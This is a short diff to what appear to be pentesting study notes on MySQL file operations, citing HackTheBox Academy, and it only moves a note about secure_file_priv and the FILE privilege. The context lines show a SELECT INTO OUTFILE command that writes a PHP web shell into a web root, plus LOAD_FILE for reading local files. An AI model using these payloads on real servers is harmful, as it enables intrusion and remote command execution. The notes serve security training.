@@ -49,11 +49,13 @@ SELECT "<string_to_be_written_in_file>" INTO OUTFILE '<file_abspath>'
 #Example
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
-Note: The readiness of this operation is limited by a global system variable, secure_file_priv, also file operations require respective user have FILE privilege
 
 Read Local File:
 ```
 select LOAD_FILE("<abspath_tofile>")
 ```
+Note: The readiness of this operation is limited by a global system variable, secure_file_priv, also file operations require respective user have FILE privilege
+
+
 
 Ref: https://academy.hackthebox.com/app/module/112/section/1238
